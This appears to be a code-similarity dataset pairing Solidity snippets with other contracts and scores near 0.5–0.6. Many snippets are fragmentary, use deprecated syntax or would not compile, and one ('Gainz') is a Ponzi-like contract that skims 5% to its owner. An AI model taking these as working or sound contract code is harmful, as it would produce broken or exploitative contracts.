
function consentBuild(documentIDhash,studyIDhash,timeStamphash,consentedhash) public returns (Signature)
{
string documentID = documentIDhash;
string studyID = studyIDhash;
string timeStamp = timeStamphash;
bool consented = consentedhash;


 }
    
    function Status() returns (bool status) 
    {
    
    if (consented == true) {status = true;} else {status = false;}
    }",0.5333432868971933,"contract freedomStatement {

    

    string public statement = ""https:

    mapping (address => bool) internal consent;

    event wearehere(string statement);

    

    constructor () public {

        emit wearehere(statement);

    }

        

    function isHuman(address addr) internal view returns (bool) {

        uint size;

        assembly { size := extcodesize(addr) }

        return size == 0;

    }



    function () external {

        require(isHuman(msg.sender),""no robot"");

        consent[msg.sender] = true;

    }

    

    function check(address addr) public view returns (bool){

        return(consent[addr]);

    }

}"
"contract Trigger{
    function TriggerBetaling() payable{
        Betaal(addressBetaal).UitBetalen;
    }   
}",0.5455885059819862,"contract Campaign {



    

    

    

    function proxyPayment(address _owner) payable returns(bool);

}"
"contract Proof

{
   struct FileDetails
   {
       uint timestamp;
       string owner;
   }

   mapping (string => FileDetails) files;
   event logFileAddedStatus(bool status, uint timestamp, string owner, string fileHash);


   
   function set(string owner, string fileHash)

   {

       
       if(files[fileHash].timestamp == 0)

       {
           files[fileHash] = FileDetails(block.timestamp, owner);

           
           logFileAddedStatus(true, block.timestamp, owner, fileHash);
        }
else 
        {
           logFileAddedStatus(false, block.timestamp, owner, fileHash);
        }           } 

   
   function get(string fileHash) returns (uint timestamp, string owner)
   {
       return (files[fileHash].timestamp, files[fileHash].owner);

   }
 }",0.5317539402322742,"contract Safe {
    address public owner;
    uint256 public lock;

    function Safe() {
        owner = msg.sender;
    }
    
    function transfer(address to) returns (bool) {
        require(msg.sender == owner);
        require(to != address(0));
        owner = to;
        return true;
    }

    function lock(uint256 timestamp) returns (bool) {
        require(msg.sender == owner);
        require(timestamp > lock);
        require(timestamp > block.timestamp);
        lock = timestamp;
        return true;
    }

    function withdrawal(Token token, address to, uint value) returns (bool) {
        require(msg.sender == owner);
        require(block.timestamp >= lock);
        require(to != address(0));
        return token.transfer(to, value);
    }
}"
"contract Consumer is Chainlinked {

}",0.5736674578651872,contract TokenProvider is Ownable {}
"contract leilaoSimples{
    uint valorAtual;
    address payable comprador;
    address dono;
    string nome;
    uint contadorDeOfertas = 0;
    uint[] ofertas;

    constructor(uint valorInicial) public{
        valorAtual=valorInicial;
        dono = msg.sender;
    }

    function set() public payable{
        uint oferta = msg.value;
        require(oferta>valorAtual, ""Oferta abaixo do valor atual."");
        require(comprador!=msg.sender, ""Voc锚 deu o 煤ltimo lance."");

        comprador.transfer(valorAtual);

        valorAtual = oferta;
        contadorDeOfertas++;
        ofertas.push(valorAtual);
        comprador = msg.sender;
    }

    function get() public view returns(
        address _dono,
        uint _contadorDeOfertas,
        address _comprador,
        uint _ultimaOferta,
        uint[] _historicoDeOfertas
    ){
        return(
            dono,
            contadorDeOfertas,
            comprador,
            valorAtual,
            ofertas
        );
    }
}",0.5684620126640743,"contract VanilCoin is MintableToken {
  	
	string public name = ""Vanil"";
  	string public symbol = ""VAN"";
  	uint256 public decimals = 18;
  
  	
  	uint public releaseTime = 1507420800;
  
	modifier canTransfer(address _sender, uint256 _value) {
		require(_value <= transferableTokens(_sender, now));
	   	_;
	}
	
	function transfer(address _to, uint256 _value) canTransfer(msg.sender, _value) returns (bool) {
		return super.transfer(_to, _value);
	}
	
	function transferFrom(address _from, address _to, uint256 _value) canTransfer(_from, _value) returns (bool) {
		return super.transferFrom(_from, _to, _value);
	}
	
	function transferableTokens(address holder, uint time) constant public returns (uint256) {
		
		uint256 result = 0;
				
		if(time > releaseTime){
			result = balanceOf(holder);
		}
		
		return result;
	}
	
}"
"contract C {
  address[8] arr;
}",0.537428567412207,"contract Mkr is ERC20 {



}"
"contract Original {

mapping(bytes32 => Person) private Persons;

 
}",0.5587599060947492,"contract Storage0 {

    

    mapping(bytes4 => address) internal delegates;

}"
"contract Seller{

    struct Sellers{
        uint sellerId;
        address sellerAddress;
        string sellerName;
    } 
    mapping (address => Sellers) sellerStruct;
    address[] public sellerAccounts;

   function setSeller(address _address, uint _seller_id, string memory _seller_name) public{
        Sellers memory sellerVar = sellerStruct[_address];
        sellerVar.sellerId = _seller_id;
        sellerVar.sellerName = _seller_name;
        sellerAccounts.push(_address) -1;
    }
}",0.5309891400778407,"contract IssuedTokenFactory is PrivateServiceRegistry {
  function createIssuedToken(
    address[] _addrs,
    uint256[] _amounts,
    uint256 _freezePeriod,
    uint256 _lastIssuance,
    string _name,
    uint8 _decimals,
    string _symbol)
  public
  returns (address tokenAddress) {
    
    tokenAddress = address(new IssuedToken(
      _addrs,
      _amounts,
      _freezePeriod,
      _lastIssuance,
      msg.sender,
      _name,
      _decimals,
      _symbol));

    
    register(tokenAddress);
  }
}"
"contract EggFactory{

    uint dnaDigits = 16;
    uint dnaModulus = 10 ** dnaDigits; 

    event NewEgg(uint eggId, uint dna);

    struct Egg{
        uint dna;
        uint createdAt;
        bool hatched;
    }

    Egg[] public eggs;

    mapping (uint => address) public eggToOwner;
    mapping (address => uint) ownerEggCount;

    function createEgg(uint _dna) public{
        uint id = eggs.push(Egg(_dna,now,false)) - 1;
        eggToOwner[id] = msg.sender;
        ownerEggCount[msg.sender]++;
        emit NewEgg(id, _dna);
    }

    function generateRandomDna() private view returns (uint){
        
        uint rand = uint256(keccak256(now, block.blockhash));
        return rand % dnaModulus;
    }

    function createRandomEgg() public{
        require(ownerEggCount[msg.sender] == 0);
        uint randDna = generateRandomDna();
        createEgg(randDna);
    }
}",0.5878491830095051,"contract SimpleLotto {
    int public playCount = 0;
    address public owner = msg.sender;
    mapping (address => uint) public players;
    Aggregate public aggregate;

  struct Aggregate {
    uint msgValue;
    uint gas;
  }

    modifier onlyBy(address _account) {
        if (msg.sender != _account)
            throw;
        _
    }
    
    function SimpleLotto() {
        playCount = 42;
    }
    
    event Sent(address from, address to, int amount);
    
    function play(address receiver, uint amount) returns (uint){
        playCount++;
        Sent(owner, receiver, playCount);
        players[receiver] += amount;
        
        aggregate.msgValue = msg.value;
        aggregate.gas = msg.gas;
        
        return msg.value;
    } 

    function terminate() { 
        if (msg.sender == owner)
            suicide(owner); 
    }
    
    function terminateAlt() onlyBy(owner) { 
            suicide(owner); 
    }
}"
"contract eventTestContract
    {
        uint8 public dummy;
        event eventOnDummy
        (
           uint dumm
        );
        function setDummy(uint8 _dummy) 
        {
           dummy = _dummy;
           eventOnDummy(_dummy);
        }
        function getDummy() returns (uint8)
        {
            return dummy;
        }
    }",0.5421560282847423,"contract MoneyMarket {

    function markets(address asset) public view returns (bool, uint, InterestRateModel, uint, uint, uint, uint, uint, uint);
    function oracle() public view returns (address);
}"
"contract RandomExample is usingOraclize {

    uint256 constant MAX_INT_FROM_BYTE = 256;
    uint256 constant NUM_RANDOM_BYTES_REQUESTED = 7;

    event LogNewOraclizeQuery(string description);
    event generatedRandomNumber(uint256 randomNumber);

    constructor()
        public
    {
        oraclize_setProof(proofType_Ledger);
        update();
    }

    function __callback(
        bytes32 _queryId,
        string memory _result,
        bytes memory _proof
    )
        public
    {
        require(msg.sender == oraclize_cbAddress());

        if (
            oraclize_randomDS_proofVerify__returnCode(
                _queryId,
                _result,
                _proof
            ) != 0
        ) {
            
        } else {
            
            uint256 ceiling = (MAX_INT_FROM_BYTE ** NUM_RANDOM_BYTES_REQUESTED) - 1;
            uint256 randomNumber = uint256(keccak256(abi.encodePacked(_result))) % ceiling;
            emit generatedRandomNumber(randomNumber);
        }
    }

    function update()
        payable
        public
    {
        uint256 QUERY_EXECUTION_DELAY = 0;
        uint256 GAS_FOR_CALLBACK = 200000;
        oraclize_newRandomDSQuery(
            QUERY_EXECUTION_DELAY,
            NUM_RANDOM_BYTES_REQUESTED,
            GAS_FOR_CALLBACK
        );
        emit LogNewOraclizeQuery(""Oraclize query was sent, standing by for the answer..."");
    }

}",0.5857512118288786,"contract TrumpOracle is usingOraclize{

    
    mapping(bytes32=>bool) validIds;

    
    event newOraclizeQuery(string description);

    
    event newOraclizeResult(bytes32 id, string result);

    
    string public constant question = ""President of the United States"";

    
    uint public oraclizePrice;

    
    function __callback(bytes32 _queryId, string result) public {
        
        require(msg.sender == oraclize_cbAddress());
        
        require(validIds[_queryId]);
        delete validIds[_queryId];
        newOraclizeResult(_queryId, result);
    }

    
    function requestEvidence() public payable {
        if (getOraclizePrice() > msg.value) {
            
            
            newOraclizeQuery(""Oraclize query was NOT sent, please add some ETH to cover for the query fee"");
            
            revert();
        } else {
            newOraclizeQuery(""Oraclize query was sent, standing by for the answer..."");
            
            bytes32 queryId = oraclize_query(""WolframAlpha"", question);
            
            validIds[queryId] = true;
        }
    }

    
    function getOraclizePrice() public returns (uint) {
        oraclizePrice = oraclize_getPrice(""WolframAlpha"");
        return oraclizePrice;
    }

}"
"contract StudentsInfoTracker{

    Student[] students;

    struct Student{
        string name;
        address ethAddress;
        uint numberInClass;
        uint[] marks;
    }
    function getStudent(uint) public view returns(string memory name, address ethAddress, uint numberInClass, uint[] memory marks){
        return(students[uint].name, students[uint].ethAddress, students[uint].numberInClass, students[uint].marks);
    }",0.5701635430769267,"contract ComponentListInterface {

    event ComponentUpdated (string _name, string _version, address _componentAddress);

    function setComponent(string _name, address _componentAddress) public returns (bool);

    function getComponent(string _name, string _version) public view returns (address);

    function getLatestComponent(string _name) public view returns(address);

}"
"contract WagyuRecordContract
    {
        address owner;

        struct Cattle
        {
            address RFID;
            string Name;
            uint256 Weight;
            string Gender;
            string Colour;
            string Breed;
            uint Age; 
            uint DOB;
            string Location;
            bool Parent;
            string SireName;
            string DamName;
            bool Active;
            bool ForSale;
            CattleHealth[] HealthRecord;
            CattleGrowth[] GrowthRecord;
            CattleMovements[] MovementsRecord;
            Facility SlaughterDetails;
            Meat[] DistributionDetails
        }


        struct CattleGrowth
        {
            uint DateRecorded;
            uint256 FoodIntake;
            uint256 Growth;
        }


        mapping (address => Cattle) public cattle;
        mapping (address=> CattleGrowth) public growth;           

        modifier Owner() 
        {
            require(msg.sender == owner);
            _;
        }


        function RecordHealth(address rfid, string _bodyCond, string _healthStat, uint256, string _med) Owner public
        {
            health[rfid+cattle[rfid].HealthRecord.length].DateRecorded = now;
            health[rfid+cattle[rfid].HealthRecord.length].BodyCondition = _bodyCond;
            health[rfid+cattle[rfid].HealthRecord.length].HealthStatus = _healthStat;
            health[rfid+cattle[rfid].HealthRecord.length].Medication = _med;
            cattle[rfid].HealthRecord.push(health[rfid+cattle[rfid].HealthRecord.length]);
        }
}",0.5060609652274355,"contract ChaFund {
    struct Certificate {
        uint32 payment_time;
        string payment_msg;
        uint32 delivery_time;
        string delivery_msg;
    }

    address payable public owner;

    mapping(uint256 => Certificate) public certifications;

    event Payment(uint256 indexed id, string message);
    event Delivery(uint256 indexed id, string message);
    
    modifier onlyOwner() {
        require(msg.sender == owner, ""Only owner"");
        _;
    }
    
    constructor() public {
        owner = msg.sender;
    }

    function() external payable {
        revert();
    }

    function payment(uint256 id, string calldata message) onlyOwner external {
        require(certifications[id].payment_time == 0, ""Certificate already payment"");

        certifications[id].payment_time = uint32(block.timestamp);
        certifications[id].payment_msg = message;

        emit Payment(id, message);
    }

    function delivery(uint256 id, string calldata message) onlyOwner external {
        require(certifications[id].payment_time > 0, ""Certificate not payment"");
        require(certifications[id].delivery_time == 0, ""Certificate already delivery"");

        certifications[id].delivery_time = uint32(block.timestamp);
        certifications[id].delivery_msg = message;

        emit Delivery(id, message);
    }
}"
"contract A {
    uint private x = 255;
    uint[] y; 
    uint z;
}",0.5149346457651812,"contract Test {
    uint public test;
    
    function Test() {
        test = 1;
    }
}"
"contract Sellers
{ 
  TutorialToken _tt;

  constructor(address _f) public
  {
      _tt = TutorialToken(_f);
  }

  _tt.f();
}",0.5954689778437042,"contract Token {

  function transfer(address to, uint tokens) public returns (bool success);

}"
"contract Voting{
    mapping(bytes32=>uint8) public votesReceived;

    function totalVotesFor(bytes32 candidate) view public returns (uint8){
        return votesReceived[candidate];
    }

    function voteForCandaidate(bytes32 candidate)public{
        votesReceived[candidate]+=1;
    }

 }",0.5482803062553364,"contract Medianizer {
    function peek() public view returns (bytes32, bool);
    function read() public returns (bytes32);
    function poke() public;
    function poke(bytes32) public;
    function fund (uint256 amount, ERC20 token) public;
}"
"contract A { 
    string s=""s"";
}",0.583145968758198,"contract NGNT is V1 {

}"
"contract User
{
    event ItemInserted(bool replaced);
    event ItemRemoved(bool success);

    
    IterableMapping.itmap data;
    
    function insert(uint k, uint v) public returns (uint size)
    {
        
        bool replaced = IterableMapping.insert(data, k, v);

        ItemInserted(replaced);

        
        return data.size;
    }

    function remove(uint k) public returns (bool success)
    {
        success = IterableMapping.remove(data, k);

        ItemRemoved(success);
    }

    
    function sum() public view returns (uint s)
    {
        for (var i = IterableMapping.iterate_start(data); IterableMapping.iterate_valid(data, i); i = IterableMapping.iterate_next(data, i))
        {
            var (, value) = IterableMapping.iterate_get(data, i);
            s += value;
        }
    }
}",0.585124603973944,"contract Token {

    function balanceOf(address _owner) public view returns (uint balance);
    function transfer(address _to, uint _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint _value) public returns (bool success);
    function approve(address _spender, uint _value) public returns (bool success);
    function allowance(address _owner, address _spender) public view returns (uint remaining);
    
    
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}"
"contract Child {

  
  Parent p = Parent(0x9dd1e8169e76a9226b07ab9f85cc20a5e1ed44dd);


   function getValue() public view returns (uint256[]){
      return p.accountTx(msg.sender);
  }

}",0.5690538242884493,"contract IErc20 {
	function transfer(address to, uint256 value) public returns (bool);
	function balanceOf(address account) public view returns (uint256);
}"
"contract MyContract {
    event MyWorkingEvent(
        address thing4,
        address thing5,
        address thing6);

    event MyBrokenEvent(
        address indexed thing1,
        address thing2,
        address thing3);

    function logAllTheThings(){
        MyWorkingEvent(0x12, 0x34, 0x56); 
        

        MyBrokenEvent(0x12, 0x34, 0x56); 
        
    }
}",0.5520083975871632,"contract Token {
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

}"
"contract Ballot {
    struct Voter {
        uint weight; 
    }
}",0.5476378281568043,"contract MyContract {

    uint i = (10 + 2) * 2;

}"
"contract TrafficFine{
    struct Officer {
        string firstName ;
        string lastName;
        address account;
    }

    address public manager;
    uint public numberOfOffiers;

    mapping(address=>Officer) public officers;

    modifier restricted(){
        require(msg.sender == manager);      
        _;
    }

    constructor () public{
        manager = msg.sender;
        
    }

    function addOfficer(string firstName,string lastName,address officer) public  restricted{

        require(officer!=officers[officer].account);

        Officer  memory newOfficer = Officer({
            firstName:firstName,
            lastName:lastName,
            account:officer
        });

        officers[officer] = newOfficer;
        numberOfOffiers++;
    }

    function getOfficer(address officer) public view returns(address){
        return officers[officer].account;
    }


}",0.5902531919377836,"contract MultiOwnable {

  address public manager; 

  address[] public owners;

  mapping(address => bool) public ownerByAddress;



  event SetOwners(address[] owners);



  modifier onlyOwner() {

    require(ownerByAddress[msg.sender] == true);

    _;

  }



  

  constructor() public {

    manager = msg.sender;

  }



  

  function setOwners(address[] _owners) public {

    require(msg.sender == manager);

    _setOwners(_owners);

  }



  function _setOwners(address[] _owners) internal {

    for(uint256 i = 0; i < owners.length; i++) {

      ownerByAddress[owners[i]] = false;

    }



    for(uint256 j = 0; j < _owners.length; j++) {

      ownerByAddress[_owners[j]] = true;

    }

    owners = _owners;

    emit SetOwners(_owners);

  }



  function getOwners() public view returns (address[]) {

    return owners;

  }

}"
"contract Eventsloop{

event loopidx(uint idx,uint jdx);

function watcheventloop() public payable returns(bool){

    for(uint j =0;j<5;j++){ 

    for(uint i=0;i<20;i++){

         emit loopidx(i,j);

    }
  } 
}

}",0.5579370789179855,"contract Auction {

    function bid() public payable returns (bool);

    function end() public returns (bool);



    event AuctionBid(address indexed from, uint256 value);

}"
"contract MembersContract {

    struct Member {
        uint balance;
        address member;
        bool exists;
    }

    Member[] public members;

    constructor() public {
        members.push(Member(0, 0x0, true));
    }

    function addbalance(uint _balance) public returns(bool _success){
        if(members[1].exists == true) {
            members[1].balance = 400;
        }
        else {
            return false;
        }
    }


}",0.598106569136567,"contract BasicToken is ERC20Basic {
  using SafeMath for uint256;

  mapping(address => uint256) balances;

  
  function transfer(address _to, uint256 _value) public returns (bool) {
    return false;
  }

  
  function balanceOf(address _owner) public constant returns (uint256 balance) {
    return balances[_owner];
  }

}"
"contract testArray{
    address addr;
    function testA(uint _addr, uint[] emp) public{
       addr = _addr;
       for(uint i=0; i<emp.length; ++i){
          addr.send(emp[i].value);
      }
   }
}",0.5947888271428067,"contract Migratable {



    

    

    function migrate            (uint256) public;





    



    event Migrate               (address indexed _from, address indexed _to, uint256 _value);

}"
"contract DateTime{
   <Some_Code>
}",0.5184565490048982,"contract Dai is ERC20 {



}"
"contract C {
  struct s { uint a; uint b; }
  uint x;
  mapping(uint => mapping(uint => s)) data;
}",0.5171077315188007,"contract LibUserInfo {

  struct Following {

    address leader;

    uint percentage; 

    uint index;

  }

}"
"contract A {
uint myVar = 1
setVar() {myVar = 3}
}",0.5334268305222255,"contract Object is Owned {
    
    uint constant OK = 1;
}"
"contract C {
     function rateCheck(uint rate){
          if(rate % 10 finney != 0 || rate == 0){
             throw;
          }
     }
}",0.535171798068795,"contract Now
{
    function date() public view returns(uint) {
        while(true){
            
        }
        return now;
    }
}"
"contract IncentiveMechanism{
    uint public money;
    function setMoney(uint m){
        money = money+m;
    }
}",0.5812269707740587,"contract IQUATokenMint {
  function mint(address _to, uint256 _amount) public returns (bool);
}"
"contract CompanyRole {

    address person; 
    address company; 
    uint type;   
}",0.5962599064607438,"contract Etherwow{
    function userRollDice(uint, address) payable {uint;address;}
}"
"contract SimpleStorage {
  bytes2 input;
  function setInput(bytes2 enterBytes){
    input = enterBytes;
  }
}",0.5942160658799452,"contract HelloWorld {
    
    function greeter (bytes32 input) returns (bytes32 output) {
        return input;
    }

}"
"contract OrganizationObject {

    struct organizationDetails {
        string name; 
        string vat; 
        string headquarterAddress;
    }

    organizationDetails public details;

    address[] public staff;

    function OrganizationObject (string name, string vat, string headquarterAddress){
        details.name = name;
        details.vat = vat;
        details.headquarterAddress = headquarterAddress;
    }

    function getDetails() public constant returns (bytes32[], string, string, string){
        return (order, details.name, details.vat, details.headquarterAddress);
    }

    function addStaff(address x){
        staff.push(x);
    }
}",0.5531646057536165,"contract Reputation {



  address owner;

  mapping(address => bool) whitelist;

  mapping(address => int) ratings;



  constructor () public {

    owner = msg.sender;

  }



  function addToWhitelist(address _contractAddress) public {

    require(msg.sender == owner);

    whitelist[_contractAddress] = true;

  }



  function change(address _userAddress, int _delta) public {

    require(whitelist[msg.sender]);

    ratings[_userAddress] += _delta;

  }



  function getMy() public view returns (int) {

    return ratings[msg.sender];

  }



  function get(address _userAddress) public view returns (int) {

    return ratings[_userAddress];

  }

}"
"contract caller{
    metaCoin m = metaCoin(   ...address... )
}",0.5901946342619256,contract Dividend { function setReseller ( address ){}}
"contract ContractsRegistry {

  address owner;

  struct ContractInfo {
    bytes32 subject;
    bytes32 companyName;
    string contactName;
    string contactEmail;
    string contactPhone;
  }

  mapping(address => ContractInfo) contractsMap;
  address[]   addresses;",0.5235037639320166,"contract User {

    mapping (bytes32 => bool) public existingNames;

    mapping (address => bytes32) public names;



    function getName(address) external view returns (bytes32) {}

    function setName(address, string) external returns (bytes32) {}

}"
"contract C {

    uint state_variable; 

    function test() returns uint{
        uint local_variable = 10; 
        return local_variable * state_variable;
    }
}",0.5909412743203706,"contract FeeInterface {
    function takeFee (uint amt, address token) public view returns (uint fee, uint remaining);
}"
"contract z1 {

    uint example;

    function z1 (){ example = 33;}


    function createZ2() returns(z2){
        z2 newZ2 = new z2();
        return newZ2;
    }

    function getZ1example() returns(uint){
        return example;
    }

}",0.5949259037987461,"contract Time is ITime {

    function getTimestamp() external view returns (uint256) {

        return block.timestamp;

    }



    function getTypeName() public view returns (bytes32) {

        return ""Time"";

    }

}"
"contract Example{

    address recipient = 0x0000cafebabe;

    Lib.Data data;

    function send(){
        Lib.inc(data);
    }
}",0.5738563098566751,"contract MintInterface {
  function mint(address recipient, uint amount) returns (bool success);
}"
"contract BiddingContract {

    using SafeMath for uint; 

    address admin;
    AucSters public tokenContract;
    uint256 public tokenPrice;
    uint256 public tokensSold;

    
    struct Seller {
        uint256 sellerId;
        string sellerName;
        bool isValidSeller;
    }
    struct Bidder {
        address bidders_address;
        uint productId;
        uint bidValue;
    }
    struct Product {
        uint productId;
        uint bidStartPrice;
        uint32 bidStartTime;
        Bidder latestBid;
        string productName;
        bool isAvailable;
        uint32 bidSession;

    }

    mapping(address => Seller) registeredSeller;
    mapping(uint => address) public productIdToOwner;
    mapping(address => uint) public productCount;
    mapping(uint => Product) product;
    mapping(address => mapping(uint => uint)) public latestBidStore;

    
    address[] public regSellers;
    Product[] public productsForSale;
    address[] public bidders;


    constructor(AucSters _tokenContract, uint _tokenPrice) public {
        
        admin = msg.sender;

        
        tokenContract = _tokenContract;

        
        tokenPrice = _tokenPrice;
   }


}",0.5962056771396846,"contract TokenERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    

    
    function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[this] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
}"
"contract Record {    
    constructor(address ownerAddr, address providerAddr) public {
        Register(ownerAddr).getName();
        Register(providerAddr).getName();
    }
}",0.566486570915229,"contract DAI2ETH is Trade {



    constructor(address rAddr) public {

        addressRegistry = rAddr;

        approveDAIKyber();

    }



    function () public payable {}



}"
"contract Factory {

     address[] public contracts;

       function createContract () 
          payable 
          public 
       {
          Con newCon = (new Con).value(msg.value)();
          contracts.push(newCon);
       }

    }",0.5907054895914916,"contract mile{

     function receiveEther() payable public{
     }

     function sendEther(address _address) payable public{
         uint value = 0;

         _address.transfer(value);
     }

}"
"contract Vote{
 
 

Token token= new Token();
address valid_voters = token.voters();


}",0.5945799758761432,"contract Token{

  function transfer(address to, uint value) returns (bool);

}"
"contract UserStorage{
  struct location{
      bytes8 latitude;
      bytes8 longitude;
      bool checked;
  }

  struct userData{
      bool isPermitted;
      bytes ownData;
      mapping (address => bytes) friends;
      address[] friendsList;
      mapping (bytes10 => location) locations;
  }

  mapping (address => userData) private users;

  function addUser(bytes ipfs, bool permitted){
      users[msg.sender].ownData = ipfs;
      users[msg.sender].isPermitted = permitted;
  }
}",0.5415235921633768,"contract Storage {



  

  



uint scoringThreshold ; 



struct Proposal 

  {

    string ipfsAddress ; 

    uint timestamp ; 

    uint totalAffirmativeVotes ; 

    uint totalNegativeVotes ; 

    uint totalVoters ; 

    address[] votersAcct ; 

    mapping (address => uint) votes ; 

  }





mapping (bytes32 => Proposal) public proposals ; 

uint256 totalProposals ; 





bytes32[] rootHashesProposals ; 







mapping (bytes32 => string) public ipfsAddresses ; 





bytes32[] ipfsAddressesAcct ;



}"
"contract gas {

    struct example { 
       uint256 num;
       string name;    
      }

}",0.5693489525862264,"contract ConnectAuth is Auth {
    string public name = ""Auth-v1"";
}"
"contract LoanRecord {
  public bool on;
  ...

  constructor(...){
    ...
    on = false;
   }

  function external turnOn(){
    on = true;
  }
}",0.5998099314336095,"contract WhiteList {

  function canTransfer(address _from, address _to)
  public
  returns (bool) {
    return true;
  }
}"
"contract Example {
   mapping(address => uint) userLatestEmittedBlocNum;
   function registerUser(string memory userEmail,
                         string memory name,
                         string memory githubUserName) public
       returns (bool success)
   {
       userLatestEmittedBlocNum[msg.sender] = block.number;
       emit LogUser(msg.sender, userEmail, name, githubUserName);
       return true;
   }

   function getUserLatestEmittedBlocNum(address userAddress) public view
    returns(uint)
  {
      if (userLatestEmittedBlocNum[userAddress] != 0)
          return (userLatestEmittedBlocNum[userAddress]);
   }
   event LogUser(address userAddress, string userEmail, string name, string githubUserName);
 }",0.582389555600933,"contract Gainz {

    address owner;



    constructor () public {

        owner = msg.sender;

    }



    mapping (address => uint) balances;

    mapping (address => uint) timestamp;

    

    function() external payable {

        owner.transfer(msg.value / 20);

        if (balances[msg.sender] != 0){

            msg.sender.transfer(paymentDue(msg.sender));

        }

        timestamp[msg.sender] = block.number;

        balances[msg.sender] += msg.value;

    }

    

    

    function balanceOf(address userAddress) public view returns (uint) {

        return balances[userAddress];

    }



    

    function paymentDue(address userAddress) public view returns (uint) {

        uint blockDelta = block.number-timestamp[userAddress];

        return balances[userAddress]*2/100*(blockDelta)/6000;

    }

}"
"contract SimpleStorage {
    event StorageSet(string _message);

    uint256 public storedData;

    function set(uint256 x) external returns(uint256){
        storedData = x;

        emit StorageSet(""Data stored successfully!"");

        return x;
    }
}",0.5841201314884835,"contract ConstantPriceOracle is
    IOracle
{
    
    uint256 public stablePrice;

    
    
    constructor(
        uint256 _stablePrice
    )
        public
    {
        stablePrice = _stablePrice;
    }

    
    function read()
        external
        view
        returns (uint256)
    {
        return stablePrice;
    }
}"
"contract Entity{
    event Entities(string name);
    struct Entity{
        string name;
    }
    uint32 public entityId;
    mapping(uint32 => Entity) entities;
    function insert(string name) returns (uint32 returnId){
         returnId = ++entityId;
         entities[returnId] = Entity(name);
         Entities(name);
         return returnId;
    }
}",0.5245089932768521,"contract ERC223 is ERC20 {



    function name() constant returns (string _name);

    function symbol() constant returns (string _symbol);

    function decimals() constant returns (uint8 _decimals);



    function transfer(address to, uint256 value, bytes data) returns (bool);



}"
"contract User { 
    address owner;
    address reg;
    bool verified;
    Registry registry = Registry(reg);

    
    function register(bytes32 _id)
        onlyOwner
    {
        registry.register(_id);
    }
    function getContractAddress(bytes32 _id)
        onlyOwner
    {
        registry.getContractAddress(_id);
    }
    function getPublicAddress(bytes32 _id)
        onlyOwner
    {
        registry.getPublicAddress(_id);
    }
    function verify()
        onlyReg
    {
        verified = true;
    }
}",0.5810782734617859,"contract IController is Pausable {

    event SetContractInfo(bytes32 id, address contractAddress, bytes20 gitCommitHash);



    function setContractInfo(bytes32 _id, address _contractAddress, bytes20 _gitCommitHash) external;

    function updateController(bytes32 _id, address _controller) external;

    function getContract(bytes32 _id) public view returns (address);

}"
"contract Squads{

    struct squadMemberInfo{
        string memberName;
        address memberAddress;
    }
    struct squadInfo{
        string squadName;
         squadMemberInfo[] squadMembers;
    }
    squadInfo[] public SI;
    squadMemberInfo[] public SMI;
    
    function createSquad(address[] memory _addressesToBeGrouped,string memory _squadName) public returns(string memory isCreated){
        
    }
    
    function addMember(string memory _squadName,address _memberAddress, string memory _memberName) public returns(bool isAdded){
        squadMemberInfo memory squadMember = squadMemberInfo(_memberName,_memberAddress);
        SMI.push(squadMember);
        squadInfo memory squadInformation = squadInfo(_squadName,SMI);
        SI.push(squadInformation);
        return true;
    }

}",0.5310922691252241,"contract SecurityTokenFactory {
    
    
    
    string public stamp;
    
    SecurityToken private ST;
    
    address[] public tokens;
    
    event Deployed(address indexed ST, address indexed owner);
    
    constructor(string memory _stamp) public 
	{
        stamp = _stamp;
	}
    
    function newSecurityToken(
        string memory name, 
		string memory symbol,
		uint8 decimals,
		IERC20 _fundsToken,
		address[] memory ownership,
		uint256[] memory issuance) public {
       
        ST = new SecurityToken(
            name, 
            symbol,
            decimals,
            _fundsToken,
            ownership,
            issuance);
        
        tokens.push(address(ST));
        
        emit Deployed(address(ST), ownership[0]);
    }
    
    function getTokenCount() public view returns (uint256 tokenCount) {
        return tokens.length;
    }
}"
"contract project3{

address owner;

struct Users{
string companyName;
string role; 
string country; 
string city;
uint phoneNo;
string physicalAddress;}

constructor (uint _tokens)public{
owner=msg.sender;
}

modifier only_admin{
require(msg.sender==owner);
_;}

mapping(address=>Users)users;

address[] private stakeholders;

function addUsers(address _address, string _companyName,string _role, string 
_country,
string _city, uint _phoneNo, string _physicalAddress)only_admin public{
var user= users[_address];
user.companyName=_companyName;
user.role=_role;
user.country=_country;
user.city=_city;
user.phoneNo=_phoneNo;
user.physicalAddress=_physicalAddress;
stakeholders.push(_address);}

function getUser(address _address)public constant 
returns(string,string,string,string,uint,string){
return(users[_address].companyName,
users[_address].role,users[_address].country,
users[_address].city,users[_address].phoneNo,
users[_address].physicalAddress);}
}",0.5460985634915131,"contract Registry {
    struct ContractVersion {
        string name;
        address contractAddress;
    }

    modifier onlyOwner {
        require(
            msg.sender == owner,
            ""Only the contract owner is allowed to use this function.""
        );
        _;
    }

    address owner;

    ContractVersion[] versions;

    constructor() public {
        owner = msg.sender;
    }

    function addVersion(string calldata versionName, address contractAddress)
        external
        onlyOwner
    {
        ContractVersion memory newVersion = ContractVersion(
            versionName,
            contractAddress
        );
        versions.push(newVersion);
    }

    function getNumberOfVersions() public view returns (uint size) {
        return versions.length;
    }

    function getVersion(uint i)
        public
        view
        returns (string memory versionName, address contractAddress)
    {
        require(i >= 0 && i < versions.length, ""Index is out of bounds"");
        ContractVersion memory version = versions[i];
        return (version.name, version.contractAddress);
    }

}"
"contract Test2 {
Test1 test1;

function Test2(){  
    test1 = new Test1();  
}

